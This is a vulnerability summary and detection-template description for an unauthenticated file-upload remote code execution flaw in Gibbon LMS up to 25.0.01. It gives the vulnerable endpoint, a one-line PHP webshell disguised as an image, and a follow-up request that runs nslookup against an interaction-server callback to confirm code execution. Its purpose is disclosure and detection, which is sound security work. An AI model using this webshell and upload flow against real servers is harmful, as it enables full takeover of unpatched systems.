## Vulnerability
Gibbon LMS <= 25.0.01 contains an unauthenticated arbitrary file upload in `/modules/Rubrics/rubrics_visualise_saveAjax.php`. Attackers can POST a base64-encoded PHP webshell (disguised as image/png) that is saved with a `.php` extension and immediately executable. This leads to full remote code execution with no authentication required.  
CVSS 3.1: 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H). Impact is complete application and server compromise. Fixed in v26.0.00.

## PoC / Detection
Classification: rce  
The template performs active exploitation for detection:  
1. POSTs a multipart-style payload to `/modules/Rubrics/rubrics_visualise_saveAjax.php` containing `img=image/png;{{rand}}.php` + base64 PHP webshell `<?php system($_GET['cmd']); ?>` (no auth headers/cookies). Matcher verifies 200 OK and filename echoed in body.  
2. GETs `/{{rand}}.php?cmd=nslookup+{{interactsh-url}}` to trigger the shell and confirm RCE via DNS callback on interactsh (matcher checks `interactsh_protocol == dns` + 200 OK).  
Two-request flow; verified true in metadata.
